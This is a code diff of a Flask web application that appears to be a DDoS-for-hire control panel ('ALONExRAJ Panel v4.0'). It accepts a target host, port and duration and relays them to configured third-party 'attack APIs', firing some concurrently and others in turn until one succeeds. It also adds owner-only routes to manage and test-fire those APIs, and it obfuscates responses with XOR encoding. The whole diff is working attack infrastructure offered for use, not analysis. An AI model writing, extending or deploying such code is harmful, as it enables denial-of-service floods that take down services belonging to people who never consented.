+    - Priority 1, 2, 3... = try one by one in order, first success wins
+    """
+    host = data.get('ip', '').strip()
+    port = data.get('port', '80').strip()
+    time_val = data.get('time', '60').strip()
+
+    if not host:
+        return make_encoded_response({'valid': True, 'attack': False, 'message': 'Target IP/host is required'})
+    if not port:
+        port = '80'
+    if not time_val:
+        time_val = '60'
+
+    # Load enabled attack APIs sorted by priority
+    apis = load_enabled_attack_apis()
+    if not apis:
+        return make_encoded_response({'valid': True, 'attack': False, 'message': 'No attack APIs configured'})
+
+    # Separate priority-0 (concurrent) and priority 1+ (sequential)
+    concurrent_apis = [a for a in apis if a.get('priority', 1) == 0]
+    sequential_apis = [a for a in apis if a.get('priority', 1) > 0]
+
+    results = []
+
+    # Fire all priority-0 APIs simultaneously
+    if concurrent_apis:
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        with ThreadPoolExecutor(max_workers=len(concurrent_apis)) as executor:
+            futures = {executor.submit(_fire_attack_api, ac, host, port, time_val): ac for ac in concurrent_apis}
+            for future in as_completed(futures):
+                success, message, status_code = future.result()
+                if success:
+                    results.append(message)
+
+    # Fire sequential APIs (priority 1, 2, 3...) — first success wins
+    if sequential_apis:
+        for api_config in sequential_apis:
+            success, message, status_code = _fire_attack_api(api_config, host, port, time_val)
+            if success:
+                results.append(message)
+                break  # First success = stop
+
+    if results:
+        return make_encoded_response({
+            'valid': True,
+            'attack': True,
+            'message': ' | '.join(results),
+            'host': host,
+            'port': port,
+            'time': time_val
+        })
+
+    # All APIs failed
+    return make_encoded_response({'valid': True, 'attack': False, 'message': 'All attack APIs failed. Try again later.'})
+
+
+# ═══════════════════════════════════════════════════════════════════
+# ATTACK API MANAGEMENT ROUTES (Owner only)
+# ═══════════════════════════════════════════════════════════════════
+
+@app.route('/api/attack-apis', methods=['GET'])
+@login_required
+@owner_required
+def api_attack_apis_list():
+    """List all configured attack APIs."""
+    return jsonify(load_attack_apis())
+
+
+@app.route('/api/attack-apis/add', methods=['POST'])
+@login_required
+@owner_required
+def api_attack_apis_add():
+    """Add a new attack API. URL template uses {ip}, {port}, {time} placeholders."""
+    data = request.json or {}
+    name = data.get('name', '').strip()
+    url = data.get('url', '').strip()
+    if not name or not url:
+        return jsonify({'error': 'Name and URL are required'}), 400
+    if '{ip}' not in url or '{port}' not in url or '{time}' not in url:
+        return jsonify({'error': 'URL must contain {ip}, {port}, and {time} placeholders'}), 400
+
+    record = {
+        'id': secrets.token_hex(8),
+        'name': name,
+        'url': url,
+        'enabled': True,
+        'priority': int(data.get('priority', 1)),
+        'timeout': int(data.get('timeout', 12)),
+        'created_at': datetime.utcnow().isoformat() + 'Z'
+    }
+    save_attack_api(record)
+    return jsonify({'status': 'success', 'id': record['id']})
+
+
+@app.route('/api/attack-apis/update', methods=['POST'])
+@login_required
+@owner_required
+def api_attack_apis_update():
+    """Update an existing attack API."""
+    data = request.json or {}
+    api_id = data.get('id', '').strip()
+    if not api_id:
+        return jsonify({'error': 'API id is required'}), 400
+
+    existing = find_attack_api(api_id)
+    if not existing:
+        return jsonify({'error': 'Attack API not found'}), 404
+
+    updates = {}
+    for field in ['name', 'url', 'enabled', 'priority', 'timeout']:
+        if field in data:
+            val = data[field]
+            if field in ('priority', 'timeout'):
+                val = int(val)
+            if field == 'enabled':
+                val = bool(val)
+            updates[field] = val
+
+    if updates:
+        attack_apis_col.update_one({'id': api_id}, {'$set': updates})
+    return jsonify({'status': 'success'})
+
+
+@app.route('/api/attack-apis/delete', methods=['POST'])
+@login_required
+@owner_required
+def api_attack_apis_delete():
+    """Delete an attack API."""
+    data = request.json or {}
+    api_id = data.get('id', '').strip()
+    if not api_id:
+        return jsonify({'error': 'API id is required'}), 400
+    delete_attack_api(api_id)
+    return jsonify({'status': 'success'})
+
+
+@app.route('/api/attack-apis/test', methods=['POST'])
+@login_required
+@owner_required
+def api_attack_apis_test():
+    """Test fire an attack API with given params."""
+    data = request.json or {}
+    api_id = data.get('id', '').strip()
+    host = data.get('host', '1.1.1.1').strip()
+    port = data.get('port', '80').strip()
+    time_val = data.get('time', '10').strip()
+
+    if not api_id:
+        return jsonify({'error': 'API id is required'}), 400
+
+    api_config = find_attack_api(api_id)
+    if not api_config:
+        return jsonify({'error': 'Attack API not found'}), 404
+
+    success, message, status_code = _fire_attack_api(api_config, host, port, time_val)
+    return jsonify({
+        'status': 'success' if success else 'failed',
+        'message': message,
+        'status_code': status_code
+    })
+
+
+
+
+
+# ═══════════════════════════════════════════════════════════════════
+# STARTUP
+# ═══════════════════════════════════════════════════════════════════
 
 start_keep_alive()
 
 if __name__ == '__main__':
-    # Get port from environment (Render sets this automatically)
     port = int(os.environ.get('PORT', 3000))
-    
-    # Disable debug in production for better performance
     debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
-    
-    print(f"[✓] Starting VISHAL PRO Panel on port {port}")
+
+    print(f"[✓] Starting ALONExRAJ Panel v4.0 on port {port}")
     print(f"[✓] Debug mode: {debug_mode}")
     print(f"[✓] Health check available at: http://localhost:{port}/health")
     print(f"[✓] Keep-alive active - will ping every 4 minutes")
-    
+    print(f"[✓] 3-Step Handshake: /connect/init → /connect/verify → /connect/action")
+    print(f"[✓] Response encoding: XOR + random nonce (no secrets needed)")
+    print(f"[✓] Attack API system: ENABLED")
+
     app.run(host='0.0.0.0', port=port, debug=debug_mode)
